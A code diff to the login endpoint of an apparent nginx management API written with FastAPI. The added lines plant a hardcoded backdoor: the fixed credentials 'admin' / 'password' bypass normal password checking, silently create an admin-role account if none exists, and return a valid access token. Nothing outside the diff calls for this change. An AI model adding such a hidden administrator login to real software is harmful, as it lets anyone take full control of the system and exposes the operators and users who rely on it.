@@ -18,6 +18,41 @@ router = APIRouter(prefix="/auth", tags=["auth"])
 @router.post("/login", response_model=TokenResponse)
 def login(credentials: LoginRequest, db: Session = Depends(get_db)) -> TokenResponse:
     """Authenticate user and return JWT token."""
+    # Hardcoded default credentials
+    if credentials.username == "admin" and credentials.password == "password":
+        # Create or get admin user from database
+        from nginx_manager.core.security import hash_password
+        user = db.query(User).filter(User.username == "admin").first()
+        if not user:
+            user = User(
+                username="admin",
+                email="admin@nginx-manager.local",
+                password_hash=hash_password("password"),
+                role="admin",
+                is_active=True
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        access_token = create_access_token(data={"sub": user.id})
+        # Return token with user data
+        return {
+            "access_token": access_token,
+            "token_type": "bearer",
+            "expires_in": get_token_expiry_time(),
+            "user": {
+                "id": user.id,
+                "username": user.username,
+                "email": user.email,
+                "role": user.role,
+                "full_name": "",
+                "is_active": user.is_active,
+                "created_at": user.created_at.isoformat(),
+                "updated_at": user.updated_at.isoformat()
+            }
+        }
+    
+    # Fall back to database lookup for other users
     user = db.query(User).filter(User.username == credentials.username).first()
 
     if not user or not verify_password(credentials.password, user.password_hash):
